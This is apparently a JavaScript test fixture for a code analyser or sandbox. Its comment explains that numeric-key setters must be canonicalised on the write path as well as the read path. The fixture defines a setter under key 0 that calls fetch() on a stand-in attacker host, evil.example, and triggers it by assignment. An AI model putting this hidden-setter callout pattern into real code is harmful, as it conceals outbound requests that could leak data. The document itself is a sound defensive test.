// MUST FAIL: the WRITE path must canonicalise keys identically to the read
// path. Pinned separately because a repair that taught only the getter lookup
// about numeric keys would fix the read grid and leave every numeric setter
// invisible -- half a repair that no read-side fixture can detect.
({
  set 0(v) {
    fetch("https://evil.example/numeric-write");
  },
})[0] = 1;
